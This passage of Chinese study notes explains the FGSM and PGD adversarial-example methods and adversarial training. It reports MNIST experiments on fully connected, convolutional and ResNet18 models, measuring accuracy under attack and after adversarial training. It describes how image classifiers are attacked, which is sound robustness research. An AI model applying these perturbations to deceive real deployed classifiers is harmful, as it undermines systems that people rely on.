$𝑥$：模型的输入。\n   - $𝑦$：与 $𝑥$ 相关联的目标（对于有目标的机器学习任务）。\n   - $𝐽(𝜃,𝑥,𝑦)$：用于训练神经网络的损失函数（成本函数）。\n2. **线性化损失函数**：\n   - 我们可以在当前参数 $𝜃$ 的值附近对损失函数 $𝐽(𝜃,𝑥,𝑦)$ 进行线性化处理，以获得一个最佳的最大范数约束扰动。\n3. **生成对抗扰动**：\n   - 对抗扰动 $𝜂$ 可以表示为： $𝜂=𝜖 * \\mathrm{sign}(\\nabla_xJ(\\theta,x,y))$\n   - 其中，$𝜖$ 是一个小的常数，用于控制扰动的大小。\n   - $\\nabla_xJ(\\theta,x,y)$ 表示损失函数对输入 $𝑥$ 的梯度。\n   - sign(⋅)sign(⋅) 是符号函数，表示取梯度中每个元素的符号（正为 +1，负为 -1）。\n4. **快速梯度符号法（FGSM）**：\n   - 这种方法被称为快速梯度符号法，用于生成对抗样本。\n   - 通过反向传播算法，可以高效地计算所需的梯度。\n\n##### 具体实例\n\n假设有一个简单的神经网络模型用于图像分类，输入 $𝑥$ 是一个手写数字图片，目标  $y$是图片对应的数字（比如3）。\n\n1. **模型参数和损失函数**：\n   - 模型的参数 $θ$ 包括权重和偏置。\n   - 损失函数 $𝐽(𝜃,𝑥,𝑦)$是交叉熵损失函数，用于评估模型预测的准确性。\n2. **计算损失函数对输入的梯度**：\n   - 通过反向传播算法，我们可以计算损失函数$ 𝐽(𝜃,𝑥,𝑦)$ 对输入 $𝑥$ 的梯度$\\nabla_xJ(\\theta,x,y)$。\n3. **生成对抗扰动**：\n   - 假设我们计算出的梯度为：$\\nabla_xJ(\\theta,x,y)=\\begin{bmatrix}-0.1&0.3&-0.2&0.4\\end{bmatrix}$\n   - 使用符号函数得到： $\\mathrm{sign}(\\nabla_xJ(\\theta,x,y))=\\begin{bmatrix}-1&1&-1&1\\end{bmatrix}$\n   - 设定一个小的扰动幅度$\\epsilon=0.1$，我们得到对抗扰动：$\\eta=0.1\\cdot\\begin{bmatrix}-1&1&-1&1\\end{bmatrix}=\\begin{bmatrix}-0.1&0.1&-0.1&0.1\\end{bmatrix}$\n4. **生成对抗样本**：\n   - 我们将扰动添加到原始输入 $𝑥$ 中，得到对抗样本$\\tilde{x}$： $\\tilde{x}=x+\\eta $\n5. **对抗样本的影响**：\n   - 新的对抗样本$\\tilde{x}$ 看起来与原始输入$x$很相似，但由于添加了精心设计的扰动，神经网络可能会错误地分类这个对抗样本。\n\n#### L1正则化 vs FGSM对抗性训练\n\n##### L1正则化\n\n- L1正则化通过在损失函数中加入权重的 L1 范数（即权重的绝对值和）来控制模型的复杂度，从而避免过拟合。\n- 损失函数为$\\mathcal{L}(w,b)+\\lambda||w||_1$，其中$\\lambda$是正则化参数。通过最小化这个损失函数，模型不仅需要减少原始损失（提高准确率），还需要控制权重的绝对值之和。这会使得某些权重变得更小，甚至接近于零，从而达到减少模型复杂度、防止过拟合的目的。\n\n##### 对抗性训练\n\n- 在对抗性训练中，我们最小化的损失函数为$\\mathbb{E}_{x,y\\sim p_{\\mathrm{data}}}\\zeta(y(||w||_1-w^Tx-b))$。\n\n- 这里的损失函数在训练过程中直接减去了权重的 L1 范数，而不是将其加到损失函数中。这种减法会在模型信心足够高时（即$\\zeta $函数饱和时）使惩罚项逐渐消失。\n\n  >  这里所说的饱和指的是当模型对某个样本的预测非常自信时，$w^Tx+b$的值使得$\\zeta $函数的输入值变得非常小，无论是正类还是负类样本，这导致$\\zeta $函数的值也很小，从而使得对抗性训练中的损失变得非常小。这种情况下，惩罚项$||w||_1$对总损失的影响变得不明显，因为模型在自信的预测上已经让损失趋近于零。\n\n##### 总结\n\n- **L1 正则化**通过惩罚权重大小来控制模型复杂度，始终存在于损失函数中。在训练过程中将 L1 惩罚项加到损失函数上，即使损失小，惩罚还是一样会增加\n- **对抗性训练**通过扰动输入数据增强模型的鲁棒性，损失函数中的惩罚项会在模型足够自信时消失。对抗性训练则将其减去，损失越小，对抗性训练的惩罚越少，达到饱和，不再影响（当模型欠拟合时，对抗性训练会导致进一步欠拟合）\n\n#### 深度模型的对抗扰动\n\n> 通用逼近定理：给定足够数量的隐藏单元和适当的权重，一个神经网络可以表示从输入到输出的几乎任何复杂关系。\n\n##### 对抗性训练 vs 数据增强\n\n前者通过对抗样本直接暴露模型的弱点，使得模型在训练过程中不断改进其决策边界，变得更加鲁棒。\n\n后者虽然能提供多样化的训练数据，但对模型潜在的脆弱性没有直接的改进效果。\n\n##### 损失函数优化\n\n$\\tilde{J}(\\boldsymbol{\\theta},\\boldsymbol{x},y)=\\alpha J(\\boldsymbol{\\theta},\\boldsymbol{x},y)+(1-\\alpha)J(\\boldsymbol{\\theta},\\boldsymbol{x}+\\epsilon \\,\\mathrm{sign}\\left(\\nabla_{\\boldsymbol{x}}J(\\boldsymbol{\\theta},\\boldsymbol{x},y)\\right).$\n\n前半部分是模型在标准输入 $\\boldsymbol{x}$ 上的损失，通常用于衡量模型在干净数据上的表现\n\n后半部分是模型在对抗样本 $\\boldsymbol{x} + \\epsilon \\, \\mathrm{sign}\\left(\\nabla_{\\boldsymbol{x}} J(\\boldsymbol{\\theta}, \\boldsymbol{x}, y)\\right)$ 上的损失。对抗样本是通过对标准输入 $\\boldsymbol{x}$ 进行小扰动生成的，这种扰动方向由损失函数对输入的梯度决定，目的是最大化损失。\n\nα 控制标准损失和对抗损失的相对权重。当 $\\alpha$ 接近 1 时，更加关注标准损失；当 $\\alpha$ 接近 0 时，更加关注对抗损失。\n\n##### 噪声添加位置选择\n\n- Szegedy等人的实验表明，在一个使用sigmoid激活函数的神经网络中，如果在隐藏层添加噪声，模型的正则化效果（即防止过拟合的能力）最好。\n- 在使用快速梯度符号方法的实验中，研究人员发现，对于那些隐藏单元激活值无界的网络，隐藏单元的激活值会变得非常大。因此，通常最好只是扰动原始输入。\n- 在饱和模型（如Rust模型）中，研究人员发现扰动输入层与扰动隐藏层的效果相当。\n- 基于旋转隐藏层的扰动解决了无界激活值增长的问题，使得加性扰动相对较小。研究人员成功训练了带有隐藏层旋转扰动的maxout网络，但效果不如扰动输入层强。\n- 由于神经网络的最后一层（线性- sigmoid或线性- softmax层）不是最终隐藏层函数的通用逼近器，将对抗扰动应用于最后隐藏层可能会遇到**欠拟合**问题。研究人员确实发现了这种效果。\n\n研究人员认为，对抗训练只有在模型**有能力学习抵抗对抗样本时**才明显有用。这仅在通用近似定理适用时才明显。\n\n##### 容量低的模型表现出好性能（RBF）\n\n>  **RBF（径向基函数）**：一种常用的激活函数，通常用于神经网络中。RBF网络使用这些函数来将输入映射到高维空间，并进行分类或回归。假设我们有一个RBF网络用于分类任务，它的激活函数是高斯函数，表示为： $\\phi(x) = \\exp(-\\frac{\\|x - \\mu\\|^2}{2\\sigma^2})$ 其中，$\\mu$ 是中心，$\\sigma$ 是标准差。RBF网络会根据输入与中心的距离来计算激活值。\n\n由于RBF单元只对特定点有强响应，对其他点的响应较弱或没有响应，这意味着它们无法识别所有相关的正类样本，从而降低了召回率。假设RBF网络用于识别手写数字“3”。网络可能只对一些非常典型的“3”有强烈响应，但对一些稍微不同的“3”响应较弱，导致它们未被识别。\n\n由于RBF单元在对抗样本（即故意加入扰动以欺骗模型的样本）上的表现较好，因为它们在不确定的情况下置信度较低，研究人员希望通过二次单元模型进一步提高这种鲁棒性。这类模型包括了更复杂的激活函数（例如二次函数），以更好地处理对抗样本。\n\n在尝试使用具有足够二次抑制（即能够抵抗对抗扰动的能力）的模型时，研究人员发现这些模型在训练集上的误差很高。这意味着模型虽然在理论上能够抵抗对抗扰动，但在实际训练中表现不佳。\n\n##### 对抗样本在不同模型之间的泛化现象\n\n对抗样本是故意添加微小扰动，使模型做出错误预测的样本。一个为某个模型生成的对抗样本，往往也能欺骗其他模型，即使这些模型的结构不同或在不同的数据上训练过。\n\n我们可以用“线性视角”来解释这一现象。根据这种观点，对抗样本在高维空间中形成了广泛的区域，而不是精细的点。\n\n具体来说，只要扰动的方向和模型的损失函数梯度方向一致，并且扰动幅度足够大，就能生成对抗样本。这些样本并不是分散在精确的位置上，而是覆盖了一个较大的子空间。\n\n研究人员假设，当前的训练方法使得神经网络在面对对抗样本时，表现得类似于一个简单的线性分类器。即使这些模型结构不同，它们学到的分类权重是相似的，这导致了对抗样本的跨模型泛化现象。\n\n这个假设解释了一部分模型错误分类的原因，但并不能解释所有情况。\n\n## PGD\n\n> 投影梯度下降（PGD）作为通用的“一阶对手”，即利用有关网络的本地一阶信息的最强攻击。\n\n#### 研究点\n\n精确地了解我们想要实现的安全保证类型，即我们想要抵抗的广泛类型的攻击（与仅防御特定的已知攻击相反）\n\n将攻击和防御纳入一个共同的理论框架中，将对抗性训练直接对应于优化\n\n#### PGD方法\n\n1. 攻击目标：PGD的目标是生成对抗性样本，即在原始输入数据 $x$ 上添加扰动 $\\delta$，使得最大化模型的损失函数 $L(\\theta, x + \\delta, y)$。这个损失函数考虑了在给定模型参数 $\\theta$ 下，经过扰动后的输入$x + \\delta$ 的预测误差。攻击者的目标是找到一个使得损失函数值最大化的扰动 $\\delta$。\n\n2. 扰动的约束：PGD通常会限制扰动 $\\delta$ 的大小，以确保生成的对抗性样本在人类感知上仍然是接近原始样本的。这种限制可以是 $\\ell_p$ 范数约束（如 $\\ell_\\infty$ 范数，即扰动的每个分量都不超过某个最大值），也可以是其他形式的约束，例如在像素空间中保持每个像素值在合理范围内。\n\n3. 算法步骤：\n   1. **初始化**：从原始输入 $x$ 开始，设定一个初始扰动 $\\delta^{(0)}$。\n   2. **迭代优化**：\n      - 对于每一轮 $t$，计算梯度 $\\nabla_\\delta L(\\theta, x + \\delta^{(t)}, y)$。\n      - 将扰动 $\\delta^{(t)}$ 更新为 $\\delta^{(t+1)} = \\text{Clip}_{\\epsilon}(\\delta^{(t)} + \\alpha \\cdot \\text{sign}(\\nabla_\\delta L(\\theta, x + \\delta^{(t)}, y)))$，其中 $\\alpha$ 是学习率，$\\text{Clip}_{\\epsilon}$ 表示对扰动进行约束，确保其不超过 $\\epsilon$ 的范围。\n   3. **终止条件**：通常根据迭代次数或者达到满足某个条件的对抗性样本来决定停止迭代。\n\n4. 优化方法：PGD通过迭代优化来找到最大化损失函数的扰动 $\\delta$，同时尽可能维持扰动的大小在合理范围内，以确保生成的对抗性样本在实际应用中具有可行性和现实意义。\n\n5. 结论：\n\n   - 使用投影梯度下降（PGD）生成对抗性样本时，对抗性损失（adversarial loss）会以相当一致的方式快速增加\n   - 通过PGD优化生成的对抗性样本的损失值在多次尝试后趋于一致。这种现象暗示着损失函数的优化空间可能存在局部最大值，但这些最大值的分布是相对稳定和可预测的。\n   - 损失函数的优化空间具有一定的结构性质，即在对抗性攻击中，通过微小扰动生成的对抗性样本的损失函数是相对一致且可预测的。这也暗示了在给定条件下，攻击者可以利用这种结构来有效地生成对抗性样本。\n   - 在不同尺度的对抗性攻击中，对抗性样本的生成方式可能不仅仅依赖于梯度的正向调整，还可能涉及到更复杂的攻击策略和模型响应方式。这提示我们在设计防御策略时需要考虑更广泛和复杂的攻击场景。\n\n   投影梯度下降（PGD）在所有一阶方法中可以被视为一种“通用”的对抗者。换句话说，通过观察和实验发现，PGD在对抗性攻击中表现出的效果和稳定性，使其成为所有基于一阶信息（例如梯度）的攻击方法中的一个普适选择。\n\n## 原理总结\n\n##### 1. 快速梯度符号方法（FGSM）：\n\n- **输入梯度计算**：对于给定的输入样本 $x$，计算其关于损失函数 $L$ 的梯度 $\\nabla_x L(\\theta, x, y)$，其中 $\\theta$ 是模型的参数， $y$ 是真实标签。\n- **对抗样本生成**：根据梯度的方向和符号，对输入 $x$ 进行修改： $x_{adv} = x + \\epsilon \\cdot \\text{sign}(\\nabla_x L(\\theta, x, y))$ 其中， $\\epsilon$ 是扰动的大小或步长， $\\text{sign}(\\cdot)$ 表示取梯度的符号。\n\nFGSM生成的对抗样本只进行一次梯度方向的扰动，因此它相对简单和高效。但由于只考虑了单步的梯度信息，生成的对抗样本可能不够健壮，容易被模型在更复杂的攻击检测中发现和修正。\n\n##### 2. 投影梯度下降（PGD）：\n\nPGD通过多次迭代梯度下降来生成对抗样本，以增加攻击的成功率和对抗的鲁棒性。\n\n- **多次迭代**：从原始样本 $x$ 开始，进行多轮迭代来生成对抗样本。\n- **梯度计算和投影**：在每一轮迭代中，计算当前样本 $x_t$ 的梯度 $\\nabla_{x_t} L(\\theta, x_t, y)$，然后将梯度方向投影到一个允许的扰动集合 $S$ 中。例如，$S$ 可以是$\\epsilon$-范数球 $ \\delta \\|_{\\infty} \\leq \\epsilon$。\n- **对抗样本更新**：根据投影后的梯度方向，更新当前样本 $x_t$： $x_{t+1} = \\text{Clip}_{x, \\epsilon}(x_t + \\alpha \\cdot \\text{sign}(\\nabla_{x_t} L(\\theta, x_t, y)))$ 其中， $\\alpha$ 是学习率（步长）， $\\text{Clip}_{x, \\epsilon}(\\cdot)$ 是将结果限制在 $x \\pm \\epsilon$ 范围内的操作。\n\nPGD通过多次迭代和投影操作，能够更有效地探索对抗样本的空间，提高了攻击的成功率和对抗的鲁棒性。相比于FGSM，PGD生成的对抗样本更具挑战性，更难以被模型检测和防御。\n\n##### 区别总结：\n\n- **迭代次数**：FGSM只进行一次梯度方向的修改，而PGD通过多次迭代来逐步优化对抗样本。\n- **复杂度**：PGD比FGSM更复杂，因为它涉及到多次梯度计算和更新操作。\n- **对抗鲁棒性**：PGD生成的对抗样本通常更具挑战性和鲁棒性，相比之下，FGSM生成的对抗样本可能较容易被检测和防御。\n\n## 实验部分\n\n#### 实验环境和基本参数\n\n```python\n\"\"\"\n实验环境：\n镜像：PyTorch 1.10.0 + Python 3.8 (Ubuntu 20.04) + Cuda 11.3\n硬件配置：GPU: 1 x RTX 2080 Ti (11GB) + CPU: 12 vCPU Intel(R) Xeon(R) Platinum 8255C @ 2.50GHz\n内存: 40GB\n存储：系统盘: 30GB + 数据盘: 50GB\n\"\"\"\n\ncriterion = nn.CrossEntropyLoss()\t# 损失函数\noptimizer = optim.SGD(model.parameters(), lr=0.01)\t# 优化函数\nepoch = 10\t# 训练迭代次数\n\n# 数据加载\ntransform = transforms.Compose([transforms.ToTensor()])\ntrain_dataset = datasets.MNIST(root='../data_row', train=True, download=True, transform=transform)\ntest_dataset = datasets.MNIST(root='../data_row', train=False, download=True, transform=transform)\ntrain_loader = torch.utils.data.DataLoader(dataset=train_dataset, batch_size=64, shuffle=True)\ntest_loader = torch.utils.data.DataLoader(dataset=test_dataset, batch_size=64, shuffle=False)\n```\n\n模型训练迭代次数：10次\n\n#### 模型选择\n\n##### 简单全连接神经网络 \n\n模型结构\n\n![SimpleFNN](FGSM.assets/SimpleFNN.png)\n\n###### 训练效果\n\n准确率 && 损失\n\n全连接层的准确率达到93%左右，损失变化波动较大（可能是迭代次数太小了？）\n\n<img src=\"FGSM.assets/SimpleFCN_accuracies.jpg\" alt=\"SimpleFCN_accuracies\" style=\"zoom: 20%;\" /><img src=\"FGSM.assets/SimpleFCN_losses.jpg\" alt=\"SimpleFCN_losses\" style=\"zoom:20%;\" />\n\n###### FGSM攻击效果\n\n样本展示\n\n<img src=\"FGSM.assets/SimpleFCN_fgsm_epsilon_0.05_batch_0_image_1.png\" alt=\"SimpleFCN_fgsm_epsilon_0.05_batch_0_image_1\" style=\"zoom: 33%;\" /><img src=\"FGSM.assets/SimpleFCN_fgsm_epsilon_0.1_batch_0_image_1.png\" alt=\"SimpleFCN_fgsm_epsilon_0.1_batch_0_image_1\" style=\"zoom: 33%;\" /><img src=\"FGSM.assets/SimpleFCN_fgsm_epsilon_0.15_batch_0_image_1.png\" alt=\"SimpleFCN_fgsm_epsilon_0.15_batch_0_image_1\" style=\"zoom: 33%;\" />\n\n<img src=\"FGSM.assets/SimpleFCN_fgsm_epsilon_0.2_batch_0_image_1.png\" alt=\"SimpleFCN_fgsm_epsilon_0.2_batch_0_image_1\" style=\"zoom: 33%;\" /><img src=\"FGSM.assets/SimpleFCN_fgsm_epsilon_0.25_batch_0_image_1.png\" alt=\"SimpleFCN_fgsm_epsilon_0.25_batch_0_image_1\" style=\"zoom: 33%;\" /><img src=\"FGSM.assets/SimpleFCN_fgsm_epsilon_0.3_batch_0_image_1.png\" alt=\"SimpleFCN_fgsm_epsilon_0.3_batch_0_image_1\" style=\"zoom: 33%;\" />\n\n攻击后的准确率随着设置的epsilons增大逐步下降，前期下降很快，特别是在0.1处下降最快，且SimpleFNN的准确度再epsilons达到0.2接近0，再增加eps就准确率就直接降为0了<img src=\"FGSM.assets/SimpleFCN_fgsm_accuracies.jpg\" alt=\"SimpleFCN_fgsm_accuracies\" style=\"zoom:25%;\" />\n\n###### **对抗训练之后的攻击效果**\n\n当以eps=0.1的对抗样本对模型做对抗训练，同样以eps为0.1的对抗样本做测试，能看出准确率有一个稳定上升，右边是对抗不同eps产生的对抗样本的效果\n\n\n\n<img src=\"FGSM.assets/SimpleFCN_adversarial_fgsm_accuracies.jpg\" alt=\"SimpleFCN_adversarial_fgsm_accuracies\" style=\"zoom: 20%;\" /><img src=\"FGSM.assets/SimpleFCN_adversarial_accuracies.jpg\" alt=\"SimpleFCN_adversarial_accuracies\" style=\"zoom:20%;\" />\n\n\n\n###### PGD攻击效果\n\n自变量：\n\n```\neps：epsilon，对抗攻击的幅度，即每次攻击时允许的最大扰动量。\nnum_iter:轮数，对抗攻击迭代的次数，即进行对抗攻击的循环次数。\nalpha：单步攻击步长，每次对原始样本进行梯度上升的步长大小\n```\n\n每种攻击幅度下的准确率的变化幅度并不大，eps为0.05时，变化规模为0.7480-0.7472，在eps为0.1就降到了0.3，0.15降到了0.12，后面还有进一步下降，但无论哪种攻击幅度，alpha和num_iter只要不是最小值，准确率下降效果都很好\n\n<img src=\"FGSM.assets/SimpleFCN_0.05_accuracies.jpg\" alt=\"SimpleFCN_0.05_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/SimpleFCN_0.1_accuracies.jpg\" alt=\"SimpleFCN_0.1_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/SimpleFCN_0.15_accuracies.jpg\" alt=\"SimpleFCN_0.15_accuracies\" style=\"zoom:10%;\" />\n\n<img src=\"FGSM.assets/SimpleFCN_0.2_accuracies.jpg\" alt=\"SimpleFCN_0.2_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/SimpleFCN_0.25_accuracies.jpg\" alt=\"SimpleFCN_0.25_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/SimpleFCN_0.3_accuracies.jpg\" alt=\"SimpleFCN_0.3_accuracies\" style=\"zoom:10%;\" />\n\n\n\n##### 卷积神经网络\n\n模型结构\n\n![SimpleCNN](FGSM.assets/SimpleCNN.png)\n\n###### 训练效果\n\n准确率 && 损失\n\n简单卷积网络的的准确率比全连接层效果较好，且迭代一次准确率就达到91%以上，同样loss的变化存在一定波动，不够平滑，但相对于全连接层效果更好\n\n<img src=\"FGSM.assets/SimpleCNN_accuracies.jpg\" alt=\"SimpleCNN_accuracies\" style=\"zoom:20%;\" /><img src=\"FGSM.assets/SimpleCNN_losses.jpg\" alt=\"SimpleCNN_losses\" style=\"zoom:20%;\" />\n\n###### FGSM攻击效果\n\n样本展示\n\n<img src=\"FGSM.assets/SimpleCNN_fgsm_epsilon_0.05_batch_0_image_1.png\" alt=\"SimpleCNN_fgsm_epsilon_0.05_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/SimpleCNN_fgsm_epsilon_0.1_batch_0_image_1.png\" alt=\"SimpleCNN_fgsm_epsilon_0.1_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/SimpleCNN_fgsm_epsilon_0.15_batch_0_image_1.png\" alt=\"SimpleCNN_fgsm_epsilon_0.15_batch_0_image_1\" style=\"zoom:33%;\" />\n\n<img src=\"FGSM.assets/SimpleCNN_fgsm_epsilon_0.2_batch_0_image_1.png\" alt=\"SimpleCNN_fgsm_epsilon_0.2_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/SimpleCNN_fgsm_epsilon_0.25_batch_0_image_1.png\" alt=\"SimpleCNN_fgsm_epsilon_0.25_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/SimpleCNN_fgsm_epsilon_0.3_batch_0_image_1.png\" alt=\"SimpleCNN_fgsm_epsilon_0.3_batch_0_image_1\" style=\"zoom:33%;\" />\n\n\n\n攻击后的准确率随着设置的epsilons变化\n\n这个变化趋势和全连接层的变化规律相似，但对抗效果比SImpleFNN好，在eps达到0.2是准确率还没完全下降到0，同样在0.1-0.15区间下降最快\n\n<img src=\"FGSM.assets/SimpleCNN_fgsm_accuracies.jpg\" alt=\"SimpleCNN_fgsm_accuracies\" style=\"zoom:25%;\" />\n\n###### **对抗训练之后的攻击效果**\n\n当以eps=0.1的对抗样本对模型做对抗训练，同样以eps为0.1的对抗样本做测试，能看出准确率有一个稳定上升，右边是对抗不同eps产生的对抗样本的效果\n\n<img src=\"FGSM.assets/SimpleCNN_adversarial_fgsm_accuracies.jpg\" alt=\"SimpleCNN_adversarial_fgsm_accuracies\" style=\"zoom: 20%;\" /><img src=\"FGSM.assets/SimpleCNN_adversarial_accuracies.jpg\" alt=\"SimpleCNN_adversarial_accuracies\" style=\"zoom:20%;\" />\n\n###### PGD攻击效果\n\n自变量：\n\n```\neps：epsilon，对抗攻击的幅度，即每次攻击时允许的最大扰动量。\nnum_iter:轮数，对抗攻击迭代的次数，即进行对抗攻击的循环次数。\nalpha：单步攻击步长，每次对原始样本进行梯度上升的步长大小\n```\n\n在eps上升到0.15之前，攻击效果并没呈现出随着其他参数增加而变化的效果，但是相同的是，每种幅度下的攻击效果相似，准确率变化幅度不大，eps为0.05，几乎没有攻击效果，其他参数增加，攻击效果反而下降，eps为1效果同样如此，特别是alpha参数增加，攻击效果下降，而eps加到0.15及以上之后，准确率的变化形式几乎和SImpleFNN一致，但是准确率保持在了0.2的最高值，效果比全连接层好\n\n<img src=\"FGSM.assets/SimpleCNN_0.05_accuracies.jpg\" alt=\"SimpleCNN_0.05_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/SimpleCNN_0.1_accuracies.jpg\" alt=\"SimpleCNN_0.1_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/SimpleCNN_0.15_accuracies.jpg\" alt=\"SimpleCNN_0.15_accuracies\" style=\"zoom:10%;\" />\n\n<img src=\"FGSM.assets/SimpleCNN_0.2_accuracies.jpg\" alt=\"SimpleCNN_0.2_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/SimpleCNN_0.25_accuracies.jpg\" alt=\"SimpleCNN_0.25_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/SimpleCNN_0.3_accuracies.jpg\" alt=\"SimpleCNN_0.3_accuracies\" style=\"zoom:10%;\" />\n\n\n\n\n\n\n\n##### 深度卷积神经网络\n\n模型结构\n\n![DeepCNN](FGSM.assets/DeepCNN.png)\n\n###### 训练效果\n\n准确率 && 损失\n\n迭代次数较小的准确率并不高，但存在\"突飞猛进\"点，即epoch为2-4区间发生了猛增，并保持高准确率，虽前期准确率没有上面两种结构高，但学习速度远超于以上两种模型，此外，损失率也很快逼近0并保持，不存在过大起伏，基本保持持续下降后保持\n\n<img src=\"FGSM.assets/DeepCNN_accuracies.jpg\" alt=\"DeepCNN_accuracies\" style=\"zoom:20%;\" /><img src=\"FGSM.assets/DeepCNN_losses.jpg\" alt=\"DeepCNN_losses\" style=\"zoom:20%;\" />\n\n###### FGSM攻击效果\n\n样本展示\n\n<img src=\"FGSM.assets/DeepCNN_fgsm_epsilon_0.05_batch_0_image_1.png\" alt=\"DeepCNN_fgsm_epsilon_0.05_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/DeepCNN_fgsm_epsilon_0.1_batch_0_image_1.png\" alt=\"DeepCNN_fgsm_epsilon_0.1_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/DeepCNN_fgsm_epsilon_0.15_batch_0_image_1.png\" alt=\"DeepCNN_fgsm_epsilon_0.15_batch_0_image_1\" style=\"zoom:33%;\" />\n\n<img src=\"FGSM.assets/DeepCNN_fgsm_epsilon_0.2_batch_0_image_1.png\" alt=\"DeepCNN_fgsm_epsilon_0.2_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/DeepCNN_fgsm_epsilon_0.25_batch_0_image_1.png\" alt=\"DeepCNN_fgsm_epsilon_0.25_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/DeepCNN_fgsm_epsilon_0.3_batch_0_image_1.png\" alt=\"DeepCNN_fgsm_epsilon_0.3_batch_0_image_1\" style=\"zoom:33%;\" />\n\n攻击后的准确率随着设置的epsilons变化\n\n效果略好于SimpleCNN，但优势不明显，eps为0.1-0.15变化最快\n\n<img src=\"FGSM.assets/DeepCNN_fgsm_accuracies.jpg\" alt=\"DeepCNN_fgsm_accuracies\" style=\"zoom:25%;\" />\n\n###### **对抗训练之后的攻击效果**\n\n当以eps=0.1的对抗样本对模型做对抗训练，同样以eps为0.1的对抗样本做测试，训练过程准确率虽有上升但不稳定，右边是对抗不同eps产生的对抗样本的效果，比上图有改进，但效果不大，对eps再增加产生的对抗样本的对抗效果不好\n\n<img src=\"FGSM.assets/DeepCNN_adversarial_fgsm_accuracies.jpg\" alt=\"DeepCNN_adversarial_fgsm_accuracies\" style=\"zoom: 20%;\" /><img src=\"FGSM.assets/DeepCNN_adversarial_accuracies.jpg\" alt=\"DeepCNN_adversarial_accuracies\" style=\"zoom:20%;\" />\n\n###### PGD攻击效果\n\n自变量：\n\n```\neps：epsilon，对抗攻击的幅度，即每次攻击时允许的最大扰动量。\nnum_iter:轮数，对抗攻击迭代的次数，即进行对抗攻击的循环次数。\nalpha：单步攻击步长，每次对原始样本进行梯度上升的步长大小\n```\n\neps大于0.15变化趋势和上面两种一致，且对抗效果优于以上两种神经网络结构，同样存在eps为0.05时，其他参数增加反而降低攻击效果\n\n<img src=\"FGSM.assets/DeepCNN_0.05_accuracies.jpg\" alt=\"DeepCNN_0.05_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/DeepCNN_0.1_accuracies.jpg\" alt=\"DeepCNN_0.1_accuracies\" style=\"zoom: 10%;\" /><img src=\"FGSM.assets/DeepCNN_0.15_accuracies.jpg\" alt=\"DeepCNN_0.15_accuracies\" style=\"zoom:10%;\" />\n\n<img src=\"FGSM.assets/DeepCNN_0.2_accuracies.jpg\" alt=\"DeepCNN_0.2_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/DeepCNN_0.25_accuracies.jpg\" alt=\"DeepCNN_0.25_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/DeepCNN_0.3_accuracies.jpg\" alt=\"DeepCNN_0.3_accuracies\" style=\"zoom:10%;\" />\n\n##### 残差神经网络\n\n模型结构\n\n![ResNet](FGSM.assets/ResNet.png)\n\n###### 训练效果\n\n准确率 && 损失\n\n效果时这四种模型中效果最好的，即使迭代次数少，但准确率已能达到98.7%以上，甚至超过了上面某些模型迭代十次的效果，损失率页很快就逼进了0\n\n<img src=\"FGSM.assets/ResNet18_accuracies.jpg\" alt=\"ResNet18_accuracies\" style=\"zoom:20%;\" /><img src=\"FGSM.assets/ResNet18_losses.jpg\" alt=\"ResNet18_losses\" style=\"zoom:20%;\" />\n\n###### FGSM攻击效果\n\n样本展示\n\n<img src=\"FGSM.assets/ResNet18_fgsm_epsilon_0.05_batch_0_image_1.png\" alt=\"ResNet18_fgsm_epsilon_0.05_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/ResNet18_fgsm_epsilon_0.1_batch_0_image_1.png\" alt=\"ResNet18_fgsm_epsilon_0.1_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/ResNet18_fgsm_epsilon_0.15_batch_0_image_1.png\" alt=\"ResNet18_fgsm_epsilon_0.15_batch_0_image_1\" style=\"zoom:33%;\" />\n\n<img src=\"FGSM.assets/ResNet18_fgsm_epsilon_0.2_batch_0_image_1.png\" alt=\"ResNet18_fgsm_epsilon_0.2_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/ResNet18_fgsm_epsilon_0.25_batch_0_image_1.png\" alt=\"ResNet18_fgsm_epsilon_0.25_batch_0_image_1\" style=\"zoom:33%;\" /><img src=\"FGSM.assets/ResNet18_fgsm_epsilon_0.3_batch_0_image_1.png\" alt=\"ResNet18_fgsm_epsilon_0.3_batch_0_image_1\" style=\"zoom:33%;\" />\n\n攻击后的准确率随着设置的epsilons变化\n\n对抗效果虽略优于其他模型，但是准确率仍下降到了0.2以下，只是没有特别逼近0，按照后面的趋势，应该能保证这个幅度\n\n<img src=\"FGSM.assets/ResNet18_fgsm_accuracies.jpg\" alt=\"ResNet18_fgsm_accuracies\" style=\"zoom:25%;\" />\n\n###### **对抗训练之后的攻击效果**\n\n当以eps=0.1的对抗样本对模型做对抗训练，同样以eps为0.1的对抗样本做测试，和深度卷积网络一样，训练过程没有保持持续上升，但是准确率提升很多，右边是对抗不同eps产生的对抗样本的效果，相比于没有对抗训练的效果提升很多\n\n<img src=\"FGSM.assets/ResNet18_adversarial_fgsm_accuracies.jpg\" alt=\"ResNet18_adversarial_fgsm_accuracies\" style=\"zoom:20%;\" /><img src=\"FGSM.assets/ResNet18_adversarial_accuracies.jpg\" alt=\"ResNet18_adversarial_accuracies\" style=\"zoom:20%;\" />\n\n###### 